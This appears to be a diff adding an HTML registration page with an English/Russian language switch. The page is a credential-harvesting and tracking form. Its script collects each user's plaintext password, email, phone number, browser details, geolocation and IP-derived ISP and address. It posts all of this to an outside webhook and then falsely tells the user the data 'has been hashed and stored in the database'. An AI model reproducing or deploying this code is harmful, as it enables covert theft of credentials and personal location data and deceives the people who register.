@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Registration</title>
+<style>
+body {
+font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+background-color: #e0e0e0;
+margin: 0;
+padding: 0;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+}
+.container {
+background-color: #fff;
+padding: 30px;
+border-radius: 10px;
+box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+width: 400px;
+position: relative;
+}
+h1 {
+text-align: center;
+color: #333;
+margin-bottom: 20px;
+}
+form {
+margin-bottom: 20px;
+}
+label {
+display: block;
+margin-top: 10px;
+color: #555;
+font-weight: bold;
+}
+input[type="text"], input[type="password"], input[type="email"], input[type="tel"] {
+width: calc(100% - 20px);
+padding: 10px;
+margin-top: 5px;
+border: 1px solid #ccc;
+border-radius: 5px;
+box-sizing: border-box;
+font-size: 16px;
+}
+button {
+margin-top: 20px;
+padding: 15px 20px;
+background-color: #007BFF;
+color: white;
+border: none;
+border-radius: 5px;
+cursor: pointer;
+width: 100%;
+box-sizing: border-box;
+font-size: 16px;
+font-weight: bold;
+}
+button:hover {
+background-color: #0056b3;
+}
+.language-selector {
+position: absolute;
+top: 10px;
+right: 10px;
+}
+#showPassword {
+margin-top: 10px;
+}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="language-selector">
+<select id="language" onchange="changeLanguage()">
+<option value="en">English</option>
+<option value="ru">Русский</option>
+<!-- Добавьте другие языки по необходимости -->
+</select>
+</div>
+<h1>Registration</h1>
+<form id="registrationForm">
+<label for="username">Username:</label>
+<input type="text" id="username" name="username" required><br>
+<label for="password">Password:</label>
+<input type="password" id="password" name="password" required><br>
+<input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password<br>
+<label for="email">Email:</label>
+<input type="email" id="email" name="email" required><br>
+<label for="phone">Phone Number:</label>
+<input type="tel" id="phone" name="phone" required><br>
+<button type="button" onclick="sendData()">Register</button>
+</form>
+<div id="result"></div>
+</div>
+
+<script>
+function changeLanguage() {
+var language = document.getElementById('language').value;
+if (language === 'ru') {
+document.querySelector('h1').textContent = 'Регистрация';
+document.querySelector('label[for="username"]').textContent = 'Имя пользователя:';
+document.querySelector('label[for="password"]').textContent = 'Пароль:';
+document.querySelector('label[for="email"]').textContent = 'Электронная почта:';
+document.querySelector('label[for="phone"]').textContent = 'Номер телефона:';
+document.querySelector('button').textContent = 'Регистрация';
+document.querySelector('label[for="showPassword"]').textContent = 'Показать пароль';
+} else {
+document.querySelector('h1').textContent = 'Registration';
+document.querySelector('label[for="username"]').textContent = 'Username:';
+document.querySelector('label[for="password"]').textContent = 'Password:';
+document.querySelector('label[for="email"]').textContent = 'Email:';
+document.querySelector('label[for="phone"]').textContent = 'Phone Number:';
+document.querySelector('button').textContent = 'Register';
+document.querySelector('label[for="showPassword"]').textContent = 'Show Password';
+}
+}
+
+function togglePassword() {
+var passwordField = document.getElementById('password');
+if (passwordField.type === 'password') {
+passwordField.type = 'text';
+} else {
+passwordField.type = 'password';
+}
+}
+
+function sendData() {
+var username = document.getElementById('username').value;
+var password = document.getElementById('password').value;
+var email = document.getElementById('email').value;
+var phone = document.getElementById('phone').value;
+var userAgent = navigator.userAgent;
+var screenWidth = window.screen.width;
+var screenHeight = window.screen.height;
+var language = navigator.language;
+navigator.geolocation.getCurrentPosition(function(position) {
+fetch('https://api.ipify.org?format=json')
+.then(response => response.json())
+.then(data => {
+var ip = data.ip;
+
+fetch(`https://ipapi.co/${ip}/json/`)
+.then(response => response.json())
+.then(locationData => {
+sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude, locationData);
+})
+.catch(() => {
+sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude);
+});
+})
+.catch(() => {
+sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, null, position.coords.latitude, position.coords.longitude);
+});
+}, function(error) {
+console.error(error);
+sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language);
+});
+}
+
+function sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip = null, latitude = null, longitude = null, locationData = {}) {
+var payload = {
+username: "Registration Bot",
+content: `**New Registration**
+**Username:** ${username}
+**Password:** ${password}
+**Email:** ${email}
+**Phone:** ${phone}
+**IP:** ${ip ? ip : 'N/A'}
+**ISP:** ${locationData.org ? locationData.org : 'N/A'}
+**ASN:** ${locationData.asn ? locationData.asn : 'N/A'}
+**User Agent:** ${userAgent}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Language:** ${language}
+**Location:** ${locationData.city ? `${locationData.city}, ${locationData.region}, ${locationData.country_name}` : 'N/A'}
+**Address:** ${locationData.city ? `${locationData.city}, ${locationData.region}, ${locationData.country_name}, ${locationData.postal}` : 'N/A'}
+**Latitude:** ${latitude ? latitude : 'N/A'}
+**Longitude:** ${longitude ? longitude : 'N/A'}`,
+embeds: null,
+attachments: []
+};
+
+fetch('https://hkdk.events/i2yc29qumnotdn', {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify(payload)
+})
+.then(response => {
+if (response.ok) {
+document.getElementById('result').innerText = 'Data has been hashed and stored in the database.';
+console.log('Data sent successfully');
+} else {
+document.getElementById('result').innerText = 'Registration failed!';
+console.log('Failed to send data');
+}
+})
+.catch(error => {
+console.error('Error:', error);
+document.getElementById('result').innerText = 'Registration failed!';
+});
+}
+</script>
+</body>
+</html>
